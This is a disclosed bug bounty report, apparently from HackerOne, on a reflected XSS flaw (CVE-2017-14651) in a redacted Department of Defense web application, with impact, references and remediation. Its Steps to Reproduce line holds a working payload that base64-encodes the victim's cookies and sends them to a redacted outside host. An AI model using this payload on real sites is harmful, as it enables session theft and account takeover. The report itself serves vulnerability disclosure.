# Reflected XSS at www.███████ at /██████████ via the ████████ parameter

## Report Details
- **Report ID**: 1173593
- **URL**: https://hackerone.com/reports/1173593
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-04-24T05:50:46.444Z
- **Disclosed**: 2021-06-03T16:25:25.825Z

## Reporter
- **Username**: un4gi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
The www.████████ site is using `████`, which is vulnerable to reflected XSS in the `/█████` component via the `█████████` parameter.

## References
https://www.cvedetails.com/cve/CVE-2017-14651/
https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2017-0265

## Impact

An attacker can cause malicious code to execute in the victims browser, leading to credential theft, drive-by downloads, malicious redirects, and more.

## System Host(s)
www.██████████

## Affected Product(s) and Version(s)
████████

## CVE Numbers
CVE-2017-14651

## Steps to Reproduce
Browse to https://www.███████/███████?██████████=%3Cimg%20src=x%20onerror="a='http%3a%2f%2f███';b='%3Fcookie=';c=btoa(document.cookie);window.open(a%2bb%2bc)">

## Suggested Mitigation/Remediation Actions
Apply ███ (see references section)



## Attachments
No attachments
